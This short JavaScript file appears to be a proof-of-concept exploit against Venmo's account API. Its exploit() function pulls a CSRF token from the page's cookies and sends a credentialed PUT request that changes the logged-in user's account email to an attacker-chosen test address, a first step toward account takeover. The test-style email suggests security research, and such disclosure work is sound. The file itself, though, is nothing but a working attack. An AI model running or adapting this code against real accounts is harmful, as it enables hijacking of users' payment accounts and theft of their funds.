var url = 'https://api.venmo.com/v1/account';

function exploit() {
    var xhr = new XMLHttpRequest();
    var csrfToken = document.cookie.match('(^|;)\\s*' + 'csrftoken2' + '\\s*=\\s*([^;]+)')?.pop() || ''
    xhr.open('PUT', url, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Accept', 'application/json');
    xhr.withCredentials = true;
    var email = `tsinfosectest+${Math.floor(Math.random() * Math.floor(500))}@gmail.com`
    var data = `{"csrftoken2": "${csrfToken}","email": "${email}"}`;
    console.log(data);
    xhr.send(data);
}

exploit();
